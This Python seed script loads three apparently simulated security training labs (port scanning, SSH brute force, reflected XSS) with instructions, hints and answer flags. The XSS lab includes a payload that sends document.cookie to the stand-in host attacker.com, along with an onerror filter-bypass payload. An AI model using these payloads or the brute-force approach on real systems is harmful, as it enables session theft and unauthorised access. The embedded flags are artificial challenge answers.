"""
Run this script to seed the database with starter labs:
    python seed.py
"""
import sys, os
sys.path.insert(0, os.path.dirname(__file__))

from app import app
from models import db, Lab

LABS = [
    {
        'title': 'Network Recon — Port Scanner',
        'description': (
            'Use Nmap-style commands to discover open ports on the target machine. '
            'Identify which services are running and capture the flag hidden in the scan output.'
        ),
        'category': 'Network',
        'difficulty': 'Easy',
        'points': 100,
        'lab_type': 'scanner',
        'instructions': (
            'Your target is 192.168.1.100.\n\n'
            '1. Run a basic port scan: `scan 192.168.1.100`\n'
            '2. Try a service version scan: `scan -sV 192.168.1.100`\n'
            '3. Scan a specific port range: `scan -p 1-100 192.168.1.100`\n\n'
            'The flag is embedded in the scan results when you discover the right service. '
            'Submit it in the format: FLAG{...}'
        ),
        'hints': [
            'Try scanning ports 20-80 first — the flag service lives in a low port.',
            'Use the -sV flag to detect service versions. The flag is in the banner.',
            'Port 22 (SSH) has the flag hidden in its version string.'
        ],
        'flags': ['FLAG{nmap_master_2024}', 'flag{nmap_master_2024}'],
        'allowed_commands': ['scan', 'nmap', 'help', 'clear', 'hint'],
    },
    {
        'title': 'Brute Force — SSH Login',
        'description': (
            'A target SSH server is running with a weak password. '
            'Use dictionary-based brute force techniques to crack the credentials and retrieve the flag.'
        ),
        'category': 'Brute Force',
        'difficulty': 'Medium',
        'points': 200,
        'lab_type': 'brute_force',
        'instructions': (
            'Target: ssh://10.0.0.5:22  User: admin\n\n'
            '1. Start with a small wordlist: `brute --target 10.0.0.5 --user admin --wordlist common`\n'
            '2. Try extended wordlist: `brute --target 10.0.0.5 --user admin --wordlist rockyou-top100`\n'
            '3. Once credentials are found, the flag will be revealed.\n\n'
            'Available wordlists: common, rockyou-top100, numeric\n'
            'WARNING: Only use against authorised targets in real life!'
        ),
        'hints': [
            'The password is in the top 20 most common passwords.',
            'Think simple — the admin left the default password.',
            "It's literally the word 'password'. Classic."
        ],
        'flags': ['FLAG{brute_force_pwned}', 'flag{brute_force_pwned}'],
        'allowed_commands': ['brute', 'hydra', 'help', 'clear', 'hint', 'wordlist'],
    },
    {
        'title': 'Cross-Site Scripting (XSS) — Reflected Attack',
        'description': (
            'A vulnerable web application reflects user input without sanitization. '
            'Craft an XSS payload to steal the session cookie and capture the flag.'
        ),
        'category': 'Web',
        'difficulty': 'Hard',
        'points': 350,
        'lab_type': 'xss',
        'instructions': (
            'Target: http://vulnerable-app.local/search?q=\n\n'
            '1. Test basic reflection: `xss --url "http://vulnerable-app.local/search" --param q --payload "<b>test</b>"`\n'
            '2. Try a simple script tag: `xss --payload "<script>alert(1)</script>"`\n'
            '3. Steal the cookie: `xss --payload "<script>document.location=\'http://attacker.com/?c=\'+document.cookie</script>"`\n\n'
            'Bypass filters if needed using encoding or event handlers.\n'
            'The flag is revealed when you successfully execute JavaScript in the context of the page.'
        ),
        'hints': [
            'The app filters <script> tags but not event handlers like onerror or onload.',
            'Try: `<img src=x onerror=alert(document.cookie)>`',
            "The cookie contains the flag. Use the steal-cookie payload to reveal it."
        ],
        'flags': ['FLAG{xss_cookie_monster}', 'flag{xss_cookie_monster}'],
        'allowed_commands': ['xss', 'payload', 'encode', 'help', 'clear', 'hint', 'test'],
    },
]


def seed():
    with app.app_context():
        db.create_all()
        added = 0
        for lab_data in LABS:
            existing = Lab.query.filter_by(title=lab_data['title']).first()
            if existing:
                print(f'  [skip] Already exists: {lab_data["title"]}')
                continue
            lab = Lab(**lab_data)
            db.session.add(lab)
            added += 1
            print(f'  [+] Seeded: {lab_data["title"]}')
        db.session.commit()
        print(f'\nDone. {added} lab(s) added.')


if __name__ == '__main__':
    seed()
